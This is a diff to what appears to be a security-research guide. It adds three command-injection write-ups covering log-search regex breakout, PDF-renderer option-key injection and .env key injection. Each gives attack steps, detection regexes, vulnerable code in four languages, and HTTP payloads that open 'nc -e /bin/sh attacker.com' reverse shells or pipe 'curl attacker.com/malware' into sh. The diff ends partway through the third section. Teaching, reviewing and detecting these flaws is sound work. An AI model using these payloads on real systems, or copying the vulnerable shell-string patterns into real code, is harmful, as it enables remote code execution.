@@ -1614,82 +1614,88 @@ Content-Length: 61
 
 ***
 
+#### Command Injection via Shell Pipelining Optimization in Distributed Log Aggregation
+
 {% stepper %}
 {% step %}
-
+Map the entire target system using Burp Suite. Focus on administrative observability dashboards, SIEM (Security Information and Event Management) integrations, or internal tools that allow users to search, filter, or export massive system logs
 {% endstep %}
 
 {% step %}
-
+Draw the application's architecture and trust boundaries inside XMind
 {% endstep %}
 
 {% step %}
-
+Decompile or reverse engineer the application according to the underlying technology stack
 {% endstep %}
 
 {% step %}
-
+Identify the "Log Streaming" architecture. In distributed environments, querying gigabytes of flat-file logs (like Nginx access logs or application debug files) directly into application memory (e.g., using `File.ReadAllLines` or `fs.readFileSync`) instantly triggers Out-Of-Memory (OOM) exceptions and crashes the backend pod
 {% endstep %}
 
 {% step %}
-
+Investigate the memory-management optimization: To avoid pulling the entire file into the application's heap, the developer delegates the filtering process directly to the underlying Operating System. The backend utilizes native OS streaming binaries (e.g., `tail`, `grep`, `awk`) to filter the text at the disk level before streaming the highly reduced result set over the network
 {% endstep %}
 
 {% step %}
-
+Analyze the execution context in the decompiled code. Because the developer needs to chain multiple native commands together (e.g., fetching the last 1000 lines _and_ filtering by a specific regex), they must utilize the OS pipe operator `|`
 {% endstep %}
 
 {% step %}
-
+Understand the fatal architectural requirement: The standard, secure execution APIs (like `ProcessStartInfo.ArgumentList` or `child_process.execFile`), which safely tokenize arguments and prevent command injection, inherently _do not support_ shell pipe operators. To make the pipe `|` function, the developer is forced to execute the command within a raw shell environment (e.g., `/bin/sh -c "tail -n 1000 app.log | grep -E '{userRegex}'"`)
 {% endstep %}
 
 {% step %}
-
+Discover the trust assumption: The developer assumes that wrapping the interpolated `userRegex` variable inside single quotes (`'`) within the shell string acts as an impenetrable execution boundary, confining the input strictly to the `grep` argument space
 {% endstep %}
 
 {% step %}
-
+Formulate the execution breakout payload. The attacker must supply an input that explicitly closes the developer's single quote, terminates the active `grep` command with a semicolon `;` or operator `&&`, initiates a new arbitrary system command, and neutralizes any trailing quotes left by the developer
 {% endstep %}
 
 {% step %}
-
+Payload structure: `'.*'; {malicious_command}; echo '`
 {% endstep %}
 
 {% step %}
-
+Authenticate to the observability dashboard as a low-privilege auditor or support technician
 {% endstep %}
 
 {% step %}
-
+Submit a log search request containing the breakout payload in the regex filter field
 {% endstep %}
 
 {% step %}
+The backend interpolates the payload into the raw shell string and invokes `/bin/sh`
+{% endstep %}
 
+{% step %}
+The Bourne shell evaluates the string sequentially. It executes the `tail` and `grep` commands, encounters the injected command separator, breaks out of the intended execution path, and executes the attacker's OS command with the privileges of the backend application worker
 
 **VSCode Regex Detection**
 
 {% tabs %}
 {% tab title="C#" %}
 ```regexp
-\b(?:Filter\s*=\s*\$?".*\(objectClass=user\).*\{|\bFilter\s*=\s*.*\+\s*[a-zA-Z_][a-zA-Z0-9_]*|SearchRequest\s*\([^)]*Filter\s*=|DirectorySearcher\s*\{[\s\S]{0,120}?Filter\s*=)
+\b(?:Process\.Start\s*\(\s*new\s+ProcessStartInfo[\s\S]{0,200}(?:FileName\s*=\s*["']\/bin\/(?:sh|bash)|Arguments\s*=).*\|.*grep|Process\.Start\s*\(.*\+.*\))
 ```
 {% endtab %}
 
 {% tab title="Java" %}
 ```regexp
-\b(?:searchFilter\s*=\s*".*\(objectClass=user\).*\+\s*|new\s+SearchControls|DirContext\.search\s*\(|LdapQueryBuilder[\s\S]{0,120}?filter)
+\b(?:Runtime\.getRuntime\(\)\.exec\s*\(\s*new\s+String\[\]\s*\{[\s\S]{0,200}["']\/bin\/(?:sh|bash)["'].*\|.*grep|ProcessBuilder\s*\(.*\|.*)
 ```
 {% endtab %}
 
 {% tab title="PHP" %}
 ```regexp
-\b(?:ldap_search\s*\(.*['"]\s*\.\s*(?:str_replace|addslashes)?\s*\(?\$|ldap_search\s*\(.*\$filter|ldap_list\s*\(.*\$filter)
+\b(?:shell_exec\s*\(\s*["']tail.*\|.*grep|exec\s*\(\s*`tail.*\|.*grep|system\s*\(.*\|.*grep|passthru\s*\(.*\|.*)
 ```
 {% endtab %}
 
 {% tab title="Node.js" %}
 ```regexp
-\b(?:filter:\s*`.*\(objectClass=user\).*\$\{|filter\s*:\s*['"].*\+\s*[a-zA-Z_]|client\.search\s*\(|ldapjs[\s\S]{0,120}?filter)
+\b(?:exec\s*\(\s*`tail.*\|.*grep|spawn\s*\(\s*["']\/bin\/(?:sh|bash)|child_process\.exec\s*\(.*\|.*grep)
 ```
 {% endtab %}
 {% endtabs %}
@@ -1699,25 +1705,25 @@ Content-Length: 61
 {% tabs %}
 {% tab title="C#" %}
 ```regexp
-Filter\s*=.*\(objectClass=user\).*\{|Filter\s*=.*\+.*|DirectorySearcher.*Filter
+Process\.Start\(new\s+ProcessStartInfo.*FileName\s*=\s*["']\/bin\/(sh|bash)["'].*\|.*grep
 ```
 {% endtab %}
 
 {% tab title="Java" %}
 ```regexp
-searchFilter\s*=.*\(objectClass=user\).*\+|DirContext\.search\(|LdapQueryBuilder.*filter
+Runtime\.getRuntime\(\)\.exec\(new\s+String\[\].*["']\/bin\/(sh|bash)["'].*\|.*grep
 ```
 {% endtab %}
 
 {% tab title="PHP" %}
 ```regexp
-ldap_search\(.*\$filter|ldap_search\(.*str_replace|ldap_list\(.*\$filter
+shell_exec\("tail.*\|.*grep|exec\(`tail.*\|.*grep
 ```
 {% endtab %}
 
 {% tab title="Node.js" %}
 ```regexp
-filter:\s*`.*\$\{|filter\s*:\s*['"].*\+|client\.search\(
+exec\(`tail.*\|.*grep|child_process\.exec\(.*\|.*grep
 ```
 {% endtab %}
 {% endtabs %}
@@ -1727,24 +1733,29 @@ filter:\s*`.*\$\{|filter\s*:\s*['"].*\+|client\.search\(
 {% tabs %}
 {% tab title="C#" %}
 ```csharp
-public class SamlProvisioningService 
+public class TelemetryStreamService 
 {
-    private readonly LdapConnection _ldapConnection;
-
-    public async Task<List<string>> HydrateUserRolesAsync(SamlAssertion assertion) 
+    public async Task<string> SearchLiveLogsAsync(string containerId, string regexFilter) 
     {
         // [1]
-        var departmentClaim = assertion.GetClaim("http://schemas.xmlsoap.org/ws/2005/05/identity/claims/department");
-
         // [2]
-        // [3]
-        // [4]
-        var searchFilter = $"(&(objectClass=user)(department={departmentClaim}))";
-        
-        var request = new SearchRequest("DC=enterprise,DC=local", searchFilter, SearchScope.Subtree, "memberOf");
-        var response = (SearchResponse)await Task.Factory.FromAsync(_ldapConnection.BeginSendRequest, _ldapConnection.EndSendRequest, request, null);
+        var rawShellCommand = $"tail -n 5000 /var/logs/containers/{containerId}.log | grep -E '{regexFilter}'";
 
-        return ExtractRolesFromLdapResponse(response);
+        // [3]
+        var processInfo = new ProcessStartInfo
+        {
+            FileName = "/bin/sh",
+            Arguments = $"-c \"{rawShellCommand}\"",
+            RedirectStandardOutput = true,
+            UseShellExecute = false,
+            CreateNoWindow = true
+        };
+
+        // [4]
+        using var process = Process.Start(processInfo);
+        using var reader = process.StandardOutput;
+        
+        return await reader.ReadToEndAsync();
     }
 }
 ```
@@ -1753,26 +1764,26 @@ public class SamlProvisioningService
 {% tab title="Java" %}
 ```java
 @Service
-public class SamlProvisioningService {
+public class TelemetryStreamService {
 
-    @Autowired
-    private LdapTemplate ldapTemplate;
-
-    public List<String> hydrateUserRoles(SamlAssertion assertion) {
+    public String searchLiveLogs(String containerId, String regexFilter) throws Exception {
         // [1]
-        String departmentClaim = assertion.getAttribute("Department");
-
         // [2]
-        // [3]
-        // [4]
-        String searchFilter = "(&(objectClass=user)(department=" + departmentClaim + "))";
-        
-        List<String> roles = ldapTemplate.search(
-            query().base("DC=enterprise,DC=local").filter(searchFilter),
-            (AttributesMapper<String>) attrs -> (String) attrs.get("memberOf").get()
-        );
+        String rawShellCommand = "tail -n 5000 /var/logs/containers/" + containerId + ".log | grep -E '" + regexFilter + "'";
 
-        return roles;
+        // [3]
+        String[] cmd = {
+            "/bin/sh",
+            "-c",
+            rawShellCommand
+        };
+
+        // [4]
+        Process process = Runtime.getRuntime().exec(cmd);
+        
+        try (BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()))) {
+            return reader.lines().collect(Collectors.joining("\n"));
+        }
     }
 }
 ```
@@ -1780,24 +1791,20 @@ public class SamlProvisioningService {
 
 {% tab title="PHP" %}
 ```php
-class SamlProvisioningService 
+class TelemetryStreamService 
 {
-    protected $ldapConnection;
-
-    public function hydrateUserRoles(SamlAssertion $assertion): array 
+    public function searchLiveLogs(string $containerId, string $regexFilter): string 
     {
         // [1]
-        $departmentClaim = $assertion->getAttribute('Department');
-
         // [2]
         // [3]
-        // [4]
-        $searchFilter = "(&(objectClass=user)(department={$departmentClaim}))";
-        
-        $search = ldap_search($this->ldapConnection, "DC=enterprise,DC=local", $searchFilter, ['memberOf']);
-        $entries = ldap_get_entries($this->ldapConnection, $search);
+        $rawShellCommand = "tail -n 5000 /var/logs/containers/{$containerId}.log | grep -E '{$regexFilter}'";
 
-        return $this->extractRoles($entries);
+        // [4]
+        // shell_exec intrinsically spawns a subshell (/bin/sh -c)
+        $output = shell_exec($rawShellCommand);
+
+        return $output ?: '';
     }
 }
 ```
@@ -1805,28 +1812,21 @@ class SamlProvisioningService
 
 {% tab title="Node.js" %}
 ```javascript
-class SamlProvisioningService {
-    static async hydrateUserRoles(assertion) {
+class TelemetryStreamService {
+    static async searchLiveLogs(containerId, regexFilter) {
         // [1]
-        let departmentClaim = assertion.attributes['Department'];
-
         // [2]
+        let rawShellCommand = `tail -n 5000 /var/logs/containers/${containerId}.log | grep -E '${regexFilter}'`;
+
         // [3]
         // [4]
-        let searchFilter = `(&(objectClass=user)(department=${departmentClaim}))`;
-
-        let opts = {
-            filter: searchFilter,
-            scope: 'sub',
-            attributes: ['memberOf']
-        };
-
+        // child_process.exec invokes a shell by default, unlike execFile
         return new Promise((resolve, reject) => {
-            ldapClient.search('DC=enterprise,DC=local', opts, (err, res) => {
-                let roles = [];
-                res.on('searchEntry', (entry) => roles.push(entry.object.memberOf));
-                res.on('end', () => resolve(roles));
-                res.on('error', (err) => reject(err));
+            exec(rawShellCommand, (error, stdout, stderr) => {
+                if (error && error.code !== 1) { // grep returns 1 on no match
+                    return reject(error);
+                }
+                resolve(stdout);
             });
         });
     }
@@ -1837,92 +1837,118 @@ class SamlProvisioningService {
 {% endstep %}
 
 {% step %}
+\[1] To handle multi-gigabyte log files efficiently, the developer defers the text processing workload directly to the OS kernel utilizing native streaming binaries (`tail` and `grep`), \[2] The backend requires chaining the commands to limit the working set _before_ applying the expensive regex evaluation, necessitating the use of the shell pipe `|` operator, \[3] Because pipe operators are features of the shell interpreter and not the OS execution API, the developer is forced to wrap the entire command within a raw `/bin/sh -c` execution block, bypassing array-based argument tokenization, \[4] The developer attempts to sandbox the user's regex filter by wrapping it in single quotes. However, because the overarching execution context is a raw shell string, an attacker can simply inject an unmatched single quote to prematurely terminate the `grep` argument, inject a command terminator (`;`), and achieve unrestricted Command Injection on the host operating system
 
+```http
+// 1. Attacker (Auditor) accesses the Log Aggregation dashboard.
+// 2. Attacker crafts a regex payload that breaks out of the single quotes and executes a reverse shell.
+POST /api/v1/telemetry/search HTTP/1.1
+Host: ops.enterprise.tld
+Authorization: Bearer <auditor_token>
+Content-Type: application/json
+
+{
+  "containerId": "auth-service-node-1",
+  "regexFilter": "ERROR.*'; nc -e /bin/sh attacker.com 4444; echo '"
+}
+
+// 3. The Backend constructs the raw shell string:
+// tail -n 5000 /var/logs/containers/auth-service-node-1.log | grep -E 'ERROR.*'; nc -e /bin/sh attacker.com 4444; echo ''
+
+// 4. The OS executes the tail command, evaluates the grep command, moves to the injected 'nc' command, 
+// establishes the reverse TCP connection to the attacker, and echoes the trailing quote to prevent syntax errors.
+```
 {% endstep %}
 
 {% step %}
-
+To support complex log aggregation without exceeding JVM/V8 memory limits, the enterprise architected a pipeline that leveraged native OS binaries. The requirement to pipe the output of one binary into another compelled the developers to execute the operation within a raw shell environment (`/bin/sh -c`). The developers assumed that structurally enclosing the user's input within single quotes would neutralize execution operators. The attacker exploited this string-building paradigm by injecting a closing quote, effectively stepping out of the `grep` argument boundaries and re-entering the executable shell scope. The host operating system evaluated the injected command terminator and executed the subsequent payload, seamlessly pivoting a read-only observability feature into full Remote Code Execution on the telemetry ingestion nodes
 {% endstep %}
 {% endstepper %}
 
 ***
 
+#### Command Injection via Dynamic Flag Flattening in Headless Renders
+
 {% stepper %}
 {% step %}
-
+Map the entire target system using Burp Suite. Focus on export features, asynchronous reporting, or media transcoding pipelines (`Export to PDF`, `Generate Invoice`, `Convert Video`)
 {% endstep %}
 
 {% step %}
-
+Draw the application's architecture and trust boundaries inside XMind
 {% endstep %}
 
 {% step %}
-
+Decompile or reverse engineer the application according to the underlying technology stack
 {% endstep %}
 
 {% step %}
-
+Identify a headless binary execution architecture. To render complex HTML into pixel-perfect PDFs, or to transcode media formats, the backend invokes highly optimized native binaries (`wkhtmltopdf`, `ffmpeg`, `pandoc`)
 {% endstep %}
 
 {% step %}
-
+Investigate the "Extensibility" optimization. Native binaries like `wkhtmltopdf` or `ffmpeg` possess hundreds of esoteric command-line flags (e.g., `--margin-top`, `--javascript-delay`, `--video-filter`). Updating the API's Data Transfer Objects (DTOs) and backend mapping logic every time a user requests a new feature is an unscalable engineering burden
 {% endstep %}
 
 {% step %}
-
+Discover the dynamic argument flattening shortcut: To provide absolute flexibility, the API accepts a free-form dictionary of `customOptions` (e.g., `{"margin-top": "10mm", "grayscale": ""}`). The backend iterates over this dictionary and dynamically concatenates the keys and values into the final OS command string
 {% endstep %}
 
 {% step %}
-
+Analyze the execution sink. Notice that the developer rigorously sanitizes and quotes the _Values_ of the dictionary to prevent injection
 {% endstep %}
 
 {% step %}
-
+Understand the hidden trust assumption: The developer explicitly assumes that the _Keys_ of a JSON object (the property names) are intrinsically safe, structural identifiers controlled by the frontend application. They fail to apply any sanitization, escaping, or whitelisting to the dictionary Keys
 {% endstep %}
 
 {% step %}
-
+Recognize the shell evaluation boundary. Even if the application attempts to use a secure execution method (like an array-based argument list), the fundamental structural injection allows the attacker to pass arbitrary new flags to the native binary. In many cases, to support complex output redirection, the developer builds a single raw string and passes it to `cmd.exe` or `/bin/sh`
 {% endstep %}
 
 {% step %}
-
+Formulate the key-based injection payload. Create an API request where the JSON Key contains the execution breakout syntax
 {% endstep %}
 
 {% step %}
-
+Payload structure: `{"--margin-top 10; curl [attacker.com/malware](https://attacker.com/malware) | sh; #": "dummy_value"}`
 {% endstep %}
 
 {% step %}
-
+The backend receives the JSON object. It iterates over the keys. It securely quotes the value (`"dummy_value"`), but prepends the raw, unescaped malicious Key directly into the command string
 {% endstep %}
 
 {% step %}
+The resulting shell string becomes: `wkhtmltopdf ----margin-top 10; curl [attacker.com/malware](https://attacker.com/malware) | sh; # "dummy_value" input.html output.pdf`
+{% endstep %}
 
+{% step %}
+The shell interprets the first command, hits the injected semicolon, and detonates the secondary command payload on the host system
 
 **VSCode Regex Detection**
 
 {% tabs %}
 {% tab title="C#" %}
 ```regexp
-\b(?:Filter\s*=\s*\$?".*\(objectClass=user\).*\{|\bFilter\s*=\s*.*\+\s*[a-zA-Z_][a-zA-Z0-9_]*|SearchRequest\s*\([^)]*Filter\s*=|DirectorySearcher\s*\{[\s\S]{0,120}?Filter\s*=)
+\b(?:foreach\s*\(\s*var\s+\w+\s+in\s+customOptions\s*\).*command\s*\+=\s*\$".*--\{.*\}|foreach\s*\(\s*(?:var|KeyValuePair).*\s+in\s+.*Options.*\).*Process\.Start|command\s*\+=\s*.*\{.*\})
 ```
 {% endtab %}
 
 {% tab title="Java" %}
 ```regexp
-\b(?:searchFilter\s*=\s*".*\(objectClass=user\).*\+\s*|new\s+SearchControls|DirContext\.search\s*\(|LdapQueryBuilder[\s\S]{0,120}?filter)
+\b(?:for\s*\(\s*Map\.Entry<.*>\s+\w+\s*:\s*customOptions\.entrySet\(\)\).*cmd\.append\s*\(\s*"--"\s*\+\s*\w+\.getKey\(\)|StringBuilder.*append\s*\(\s*"--"|ProcessBuilder\s*\(.*customOptions)
 ```
 {% endtab %}
 
 {% tab title="PHP" %}
 ```regexp
-\b(?:ldap_search\s*\(.*['"]\s*\.\s*(?:str_replace|addslashes)?\s*\(?\$|ldap_search\s*\(.*\$filter|ldap_list\s*\(.*\$filter)
+\b(?:foreach\s*\(\s*\$customOptions\s+as\s+\$key\s*=>|foreach\s*\(\s*\$.*Options.*=>.*\).*['"]--|shell_exec\s*\(.*\$key|exec\s*\(.*\$key)
 ```
 {% endtab %}
 
 {% tab title="Node.js" %}
 ```regexp
-\b(?:filter:\s*`.*\(objectClass=user\).*\$\{|filter\s*:\s*['"].*\+\s*[a-zA-Z_]|client\.search\s*\(|ldapjs[\s\S]{0,120}?filter)
+\b(?:Object\.keys\s*\(\s*customOptions\s*\)\.forEach\s*\(\s*key\s*=>.*cmd\s*\+=\s*`.*--\$\{key\}|Object\.entries\s*\(.*Options.*\).*spawn|exec\s*\(.*\$\{key\})
 ```
 {% endtab %}
 {% endtabs %}
@@ -1932,25 +1958,25 @@ class SamlProvisioningService {
 {% tabs %}
 {% tab title="C#" %}
 ```regexp
-Filter\s*=.*\(objectClass=user\).*\{|Filter\s*=.*\+.*|DirectorySearcher.*Filter
+foreach\s*\(var\s+\w+\s+in\s+customOptions\)\s*\{\s*command\s*\+=\s*\\\$".*--\{
 ```
 {% endtab %}
 
 {% tab title="Java" %}
 ```regexp
-searchFilter\s*=.*\(objectClass=user\).*\+|DirContext\.search\(|LdapQueryBuilder.*filter
+for\s*\(Map\.Entry<.*>\s+\w+\s*:\s*customOptions\.entrySet\(\)\)\s*\{\s*cmd\.append\("\s*--"\s*\+\s*\w+\.getKey\(\)
 ```
 {% endtab %}
 
 {% tab title="PHP" %}
 ```regexp
-ldap_search\(.*\$filter|ldap_search\(.*str_replace|ldap_list\(.*\$filter
+foreach\s*\(\\\$customOptions\s+as\s+\\\$key\s*=>
 ```
 {% endtab %}
 
 {% tab title="Node.js" %}
 ```regexp
-filter:\s*`.*\$\{|filter\s*:\s*['"].*\+|client\.search\(
+Object\.keys\(customOptions\)\.forEach\(key\s*=>\s*\{\s*cmd\s*\+=\s*`\s*--\\\$\\{key\}
 ```
 {% endtab %}
 {% endtabs %}
@@ -1960,25 +1986,45 @@ filter:\s*`.*\$\{|filter\s*:\s*['"].*\+|client\.search\(
 {% tabs %}
 {% tab title="C#" %}
 ```csharp
-public class SamlProvisioningService 
+public class PdfRenderingService 
 {
-    private readonly LdapConnection _ldapConnection;
-
-    public async Task<List<string>> HydrateUserRolesAsync(SamlAssertion assertion) 
+    public async Task<byte[]> RenderDocumentAsync(string htmlContent, Dictionary<string, string> customOptions) 
     {
+        var inputPath = Path.GetTempFileName() + ".html";
+        var outputPath = Path.GetTempFileName() + ".pdf";
+        await File.WriteAllTextAsync(inputPath, htmlContent);
+
         // [1]
-        var departmentClaim = assertion.GetClaim("http://schemas.xmlsoap.org/ws/2005/05/identity/claims/department");
-
         // [2]
-        // [3]
-        // [4]
-        var searchFilter = $"(&(objectClass=user)(department={departmentClaim}))";
-        
-        var request = new SearchRequest("DC=enterprise,DC=local", searchFilter, SearchScope.Subtree, "memberOf");
-        var response = (SearchResponse)await Task.Factory.FromAsync(_ldapConnection.BeginSendRequest, _ldapConnection.EndSendRequest, request, null);
+        var commandBuilder = new StringBuilder("wkhtmltopdf --quiet");
 
-        return ExtractRolesFromLdapResponse(response);
+        // [3]
+        if (customOptions != null) 
+        {
+            foreach (var option in customOptions) 
+            {
+                // [4]
+                commandBuilder.Append($" --{option.Key} \"{EscapeShellArg(option.Value)}\"");
+            }
+        }
+
+        commandBuilder.Append($" {inputPath} {outputPath}");
+
+        var processInfo = new ProcessStartInfo
+        {
+            FileName = "/bin/sh",
+            Arguments = $"-c \"{commandBuilder.ToString()}\"",
+            RedirectStandardOutput = true,
+            UseShellExecute = false
+        };
+
+        using var process = Process.Start(processInfo);
+        await process.WaitForExitAsync();
+
+        return await File.ReadAllBytesAsync(outputPath);
     }
+
+    private string EscapeShellArg(string arg) => arg.Replace("\"", "\\\"");
 }
 ```
 {% endtab %}
@@ -1986,51 +2032,68 @@ public class SamlProvisioningService
 {% tab title="Java" %}
 ```java
 @Service
-public class SamlProvisioningService {
+public class PdfRenderingService {
 
-    @Autowired
-    private LdapTemplate ldapTemplate;
+    public byte[] renderDocument(String htmlContent, Map<String, String> customOptions) throws Exception {
+        File inputFile = File.createTempFile("input", ".html");
+        File outputFile = File.createTempFile("output", ".pdf");
+        Files.write(inputFile.toPath(), htmlContent.getBytes());
 
-    public List<String> hydrateUserRoles(SamlAssertion assertion) {
         // [1]
-        String departmentClaim = assertion.getAttribute("Department");
-
         // [2]
-        // [3]
-        // [4]
-        String searchFilter = "(&(objectClass=user)(department=" + departmentClaim + "))";
-        
-        List<String> roles = ldapTemplate.search(
-            query().base("DC=enterprise,DC=local").filter(searchFilter),
-            (AttributesMapper<String>) attrs -> (String) attrs.get("memberOf").get()
-        );
+        StringBuilder cmd = new StringBuilder("wkhtmltopdf --quiet");
 
-        return roles;
+        // [3]
+        if (customOptions != null) {
+            for (Map.Entry<String, String> option : customOptions.entrySet()) {
+                // [4]
+                cmd.append(" --").append(option.getKey()).append(" \"").append(escapeShellArg(option.getValue())).append("\"");
+            }
+        }
+
+        cmd.append(" ").append(inputFile.getAbsolutePath()).append(" ").append(outputFile.getAbsolutePath());
+
+        String[] shellCmd = { "/bin/sh", "-c", cmd.toString() };
+        Process process = Runtime.getRuntime().exec(shellCmd);
+        process.waitFor();
+
+        return Files.readAllBytes(outputFile.toPath());
     }
+
+    private String escapeShellArg(String arg) { return arg.replace("\"", "\\\""); }
 }
 ```
 {% endtab %}
 
 {% tab title="PHP" %}
 ```php
-class SamlProvisioningService 
+class PdfRenderingService 
 {
-    protected $ldapConnection;
-
-    public function hydrateUserRoles(SamlAssertion $assertion): array 
+    public function renderDocument(string $htmlContent, array $customOptions): string 
     {
+        $inputPath = tempnam(sys_get_temp_dir(), 'html');
+        $outputPath = tempnam(sys_get_temp_dir(), 'pdf');
+        file_put_contents($inputPath, $htmlContent);
+
         // [1]
-        $departmentClaim = $assertion->getAttribute('Department');
-
         // [2]
-        // [3]
-        // [4]
-        $searchFilter = "(&(objectClass=user)(department={$departmentClaim}))";
-        
-        $search = ldap_search($this->ldapConnection, "DC=enterprise,DC=local", $searchFilter, ['memberOf']);
-        $entries = ldap_get_entries($this->ldapConnection, $search);
+        $cmd = "wkhtmltopdf --quiet";
 
-        return $this->extractRoles($entries);
+        // [3]
+        if (!empty($customOptions)) 
+        {
+            foreach ($customOptions as $key => $value) 
+            {
+                // [4]
+                $cmd .= " --{$key} " . escapeshellarg($value);
+            }
+        }
+
+        $cmd .= " {$inputPath} {$outputPath}";
+
+        shell_exec($cmd);
+
+        return file_get_contents($outputPath);
     }
 }
 ```
@@ -2038,28 +2101,31 @@ class SamlProvisioningService
 
 {% tab title="Node.js" %}
 ```javascript
-class SamlProvisioningService {
-    static async hydrateUserRoles(assertion) {
+class PdfRenderingService {
+    static async renderDocument(htmlContent, customOptions) {
+        const inputPath = `/tmp/${crypto.randomUUID()}.html`;
+        const outputPath = `/tmp/${crypto.randomUUID()}.pdf`;
+        fs.writeFileSync(inputPath, htmlContent);
+
         // [1]
-        let departmentClaim = assertion.attributes['Department'];
-
         // [2]
-        // [3]
-        // [4]
-        let searchFilter = `(&(objectClass=user)(department=${departmentClaim}))`;
+        let cmd = `wkhtmltopdf --quiet`;
 
-        let opts = {
-            filter: searchFilter,
-            scope: 'sub',
-            attributes: ['memberOf']
-        };
+        // [3]
+        if (customOptions) {
+            Object.keys(customOptions).forEach(key => {
+                // [4]
+                let safeValue = customOptions[key].replace(/"/g, '\\"');
+                cmd += ` --${key} "${safeValue}"`;
+            });
+        }
+
+        cmd += ` ${inputPath} ${outputPath}`;
 
         return new Promise((resolve, reject) => {
-            ldapClient.search('DC=enterprise,DC=local', opts, (err, res) => {
-                let roles = [];
-                res.on('searchEntry', (entry) => roles.push(entry.object.memberOf));
-                res.on('end', () => resolve(roles));
-                res.on('error', (err) => reject(err));
+            exec(cmd, (error) => {
+                if (error) return reject(error);
+                resolve(fs.readFileSync(outputPath));
             });
         });
     }
@@ -2070,92 +2136,125 @@ class SamlProvisioningService {
 {% endstep %}
 
 {% step %}
+\[1] The microservice utilizes a powerful headless binary (like `wkhtmltopdf`) to generate pixel-perfect PDF documents from HTML, \[2] To compile the command line, the developer relies on building a single raw string, which is later dispatched to the operating system's native shell evaluator, \[3] To support future business requirements without modifying backend data structures, the endpoint accepts a dynamic dictionary of rendering configuration flags, \[4] The asymmetric sanitization failure. The developer applies strict escaping functions (`escapeshellarg`, `Replace`) exclusively to the dictionary _values_. They implicitly trust the dictionary _keys_, concatenating them directly into the shell string. An attacker exploits this by transferring their injection payload out of the heavily sanitized Value string and embedding it directly into the unsanitized Key string
 
+```http
+// 1. Attacker interacts with the PDF export module.
+// 2. Attacker crafts a JSON payload where the injection vector is hidden entirely within the Object Key.
+POST /api/v1/reports/export-pdf HTTP/1.1
+Host: report-service.enterprise.tld
+Authorization: Bearer <low_privilege_token>
+Content-Type: application/json
+
+{
+  "htmlContent": "<h1>Quarterly Report</h1>",
+  "customOptions": {
+    "margin-top 10; nc -e /bin/sh attacker.com 4444; #": "dummy_value"
+  }
+}
+
+// 3. The Backend iterates over the options. It escapes "dummy_value" safely.
+// 4. It concatenates the raw Key into the shell command string:
+// wkhtmltopdf --quiet --margin-top 10; nc -e /bin/sh attacker.com 4444; # "dummy_value" /tmp/input.html /tmp/output.pdf
+
+// 5. The OS shell executes wkhtmltopdf, encounters the semicolon, and spawns the reverse shell.
+// The '#' character comments out the rest of the string to ensure the payload doesn't throw syntax errors.
+```
 {% endstep %}
 
 {% step %}
-
+To ensure the PDF generation microservice could rapidly adapt to new UI requirements, developers implemented a dynamic argument builder that mapped JSON dictionaries directly to command-line execution flags. The security architecture focused entirely on sanitizing the content of the parameters (the Values), while implicitly trusting the structure of the payload (the Keys). The attacker inverted this trust model by encapsulating the execution breakout sequence inside the JSON property name. When the backend iterated over the dictionary, it successfully sanitized the inert value but injected the poisoned key directly into the raw OS shell string. The shell interpreted the injected key as a structural command separator, executing the injected system binaries and exposing the backend rendering pod to total remote compromise
 {% endstep %}
 {% endstepper %}
 
 ***
 
+#### RCE via DotEnv Shell Synthesis in Ephemeral Container Orchestration
+
 {% stepper %}
 {% step %}
-
+Map the entire target system using Burp Suite. Focus intensely on Serverless functions, CI/CD runners, or Multi-Tenant Cloud Provisioning features where the application spins up isolated, ephemeral execution environments (executing a user's script inside a Docker container or spinning up a dedicated tenant database pod)
 {% endstep %}
 
 {% step %}
-
+Draw the application's architecture and trust boundaries inside XMind
 {% endstep %}
 
 {% step %}
-
+Decompile or reverse engineer the application according to the underlying technology stack
 {% endstep %}
 
 {% step %}
-
+Identify the "Configuration Injection" architecture. When the orchestration microservice provisions the ephemeral container, it must securely inject tenant-specific credentials, tokens, or custom runtime settings into the container
 {% endstep %}
 
 {% step %}
-
+Investigate the security optimization: Passing API keys or database passwords via Docker/Kubernetes CLI arguments (e.g., `docker run --env SECRET=XYZ`) is highly dangerous because the secrets are logged in plaintext within the host's `/var/log/syslog` and are visible via the `ps aux` command
 {% endstep %}
 
 {% step %}
-
+Discover the "DotEnv Synthesis" workaround. To safely transport secrets into the container without exposing them to process monitoring tools, the orchestration service dynamically writes a temporary `.env` shell script to the host's disk (e.g., `/tmp/tenant_99.env`). The container's entrypoint script then securely loads these variables by sourcing the file (`source /tmp/tenant_99.env && execute_task`)
 {% endstep %}
 
 {% step %}
-
+Analyze the logic that generates this `.env` file within the orchestration backend. The backend receives a JSON dictionary of `CustomSettings` from the user's provisioning request
 {% endstep %}
 
 {% step %}
-
+Observe the iteration loop. The backend writes the environment variables to the shell file using the standard export syntax: `export {Key}="{Escaped_Value}"\n`
 {% endstep %}
 
 {% step %}
-
+Recognize the critical execution sink. The `.env` file is not a passive configuration file; it is an executable shell script that is evaluated by the Bash/Sh interpreter when the container `source`s it
 {% endstep %}
 
 {% step %}
-
+Discover the trust assumption: The backend developer rigorously shell-escapes the _Values_ but explicitly trusts the dictionary _Keys_, assuming they are strictly alphanumeric configuration identifiers
 {% endstep %}
 
 {% step %}
-
+Formulate the script breakout payload. You must supply a JSON Key that breaks the `export` statement syntax, injects an arbitrary OS command, and cleanly initiates the next `export` to prevent syntax failures
 {% endstep %}
 
 {% step %}
-
+Payload structure: `DUMMY="1"; curl [attacker.com/malware](https://attacker.com/malware) | sh; export INJECTED`
 {% endstep %}
 
 {% step %}
+Authenticate to the cloud provisioning portal and initiate a deployment
+{% endstep %}
 
+{% step %}
+Submit the malicious Key within your Custom Configuration settings
+{% endstep %}
+
+{% step %}
+The orchestration backend synthesizes the `.env` script on the underlying host node, appending your unescaped Key to the file. When the container initializes and executes `source /tmp/tenant_99.env`, the shell evaluates your injected command. The RCE occurs seamlessly during the container bootstrap phase, often executing within the orchestration node's context if the file is sourced prior to strict namespace isolation
 
 **VSCode Regex Detection**
 
 {% tabs %}
 {% tab title="C#" %}
 ```regexp
-\b(?:Filter\s*=\s*\$?".*\(objectClass=user\).*\{|\bFilter\s*=\s*.*\+\s*[a-zA-Z_][a-zA-Z0-9_]*|SearchRequest\s*\([^)]*Filter\s*=|DirectorySearcher\s*\{[\s\S]{0,120}?Filter\s*=)
+\b(?:File\.WriteAllTextAsync\s*\([^,]+,\s*\$"export\s+\{.*\}|File\.WriteAllText\s*\([^,]+,\s*\$".*\{.*\})
 ```
 {% endtab %}
 
 {% tab title="Java" %}
 ```regexp
